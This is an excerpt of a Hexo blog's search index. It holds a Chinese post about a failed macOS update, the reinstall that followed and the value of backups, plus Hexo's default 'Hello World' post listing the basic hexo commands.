<h3 id="博客转移"><a href="#博客转移" class="headerlink" title="博客转移"></a>博客转移</h3><p>​    由于blog文件没有备份，所以所有文章都不见了，也懒得再找回来了，虽然也没几篇！原<a href="http://www.cnblogs.com/AK-K/" target="_blank" rel="noopener">博客</a></p>
<p>​    有时间就更新Blog，写下自己的学习和生活路上的点点滴滴！！</p>
<h3 id="论备份的重要性"><a href="#论备份的重要性" class="headerlink" title="论备份的重要性"></a>论备份的重要性</h3><p>​    前天mac提示系统更新，由于一直没有养成打补丁前要备份的好习惯，所以就直接开始了系统更新！！但是，奇迹的事情发生了，进度条卡在半路3小时！！我就强制重启了！！然后出现了令人发指的场面！！<img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fln7wf8vz5j30xk0iihdt.jpg" alt=""></p>
<p>​    输入密码之后，就出现system崩溃的场景！！</p>
<p>​    很绝望啊，有木有！！然后就用mac实用工具修复了半天！！wifi网络不稳定，让我一直反反复复的装系统，还是没有成功！<img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fln7xxuc94j30oa0j67r8.jpg" alt="">    然后各种google百度，找解决方案，还找apple支持的客服。既然网络修复不行，那就做u盘启动盘嘛！但是！！！我并不是土豪，就只有一台mac。。<img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fln7zm6ovaj31kw0gp7wi.jpg" alt="">win下做的启动盘，人家mac根本不理你！！我。。。。。真的好绝望！！然后就下定决心，网络修复了！！最后还是回到了<img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fln818frm3j30fs04e3yt.jpg" alt="">的怀抱！！</p>
<p>​    历时3天的血的教训！！</p>
<p>​    不晓得重新装各种环境，还要多少时间！！</p>
<p>我只想说：</p>
<p>​    1.无论如何,请一定记得Timemachine是个好东西！！</p>
<p>​    2.一定要准备一个mac的u盘启动盘（预防万一）</p>
]]></content>
      
        <categories>
            
            <category> Life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 心路历程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/11/19/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        
    </entry>
    
  
  
</search>
